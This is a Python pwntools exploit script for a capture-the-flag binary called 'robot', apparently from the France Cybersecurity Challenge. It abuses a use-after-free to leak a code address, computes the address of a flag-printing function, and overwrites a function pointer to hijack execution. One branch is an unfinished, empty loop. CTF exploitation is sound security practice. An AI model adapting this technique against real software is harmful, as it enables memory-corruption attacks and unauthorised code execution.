#!/usr/bin/env python3

from pwn import * 
import sys
from pwn_utils import *

def build_robot(name):
    puntil(target, b"> ")
    target.sendline(b"1")
    puntil(target, b"> ")
    target.sendline(name)

def destroy_robot():
    puntil(target, b"> ")
    target.sendline(b"3")

def write_user_guide(guide):
    puntil(target, b"> ")
    target.sendline(b"4")
    puntil(target, b"> ")
    target.sendline(guide)

def read_user_guide():
    puntil(target, b"> ")
    target.sendline(b"5")
    # eliminate the \n from the sendline of write userguide
    print(target.recvline().strip())
    return target.recvline().strip()

def robot_speak():
    puntil(target, b"> ")
    target.sendline(b"2")

def execute_payload():
    robot_speak()

def pwn_it(guessed_address = 0x0):
    """
    # demo:

    robot_speak()
    destroy_robot()
    build_robot(b"toto-titi")
    robot_speak()
    write_user_guide(b"aaabbb")
    print(read_user_guide())
    """
    bleep_offset = 0x1289
    flag_offset = 0x147c

    build_robot(b"Trash_bot")
    destroy_robot()
    write_user_guide(b"")
    leak = read_user_guide()
    print("leak:", leak)
    bleep_addr = leak[15:23]
    flag_addr = p64(u64(bleep_addr) - bleep_offset + flag_offset)
    print("bleep_addr:", bleep_addr)
    print("flag_addr:", flag_addr)

    build_robot(b"Trash_bot")
    destroy_robot()
    write_user_guide(b"A"*16+flag_addr)
    execute_payload()


if len(sys.argv) != 2:
    print("remote, local or plz_pwn ?")
    exit(1)

target = None
if sys.argv[1] == "remote":
    target = remote("challenges.france-cybersecurity-challenge.fr", 2101)

    pwn_it()
    target.interactive()
elif sys.argv[1] == "local":
    target = process("./robot")
    gdb.attach(target, gdbscript='b *main+249')
    target.interactive()
    pwn_it()
elif sys.argv[1] == "plz_pwn":
    print("Doesn't defined")
    for i in range( 0 , 0 , 1 ): 
        target = None
        pwn_it(i)
        try: 
            target.recvline()
        except EOFError:
            pass
        except:
            target.interactive()
        else:
            target.interactive()
        target.kill()
else:
    print("remote, local or plz_pwn ?")
    exit(1)


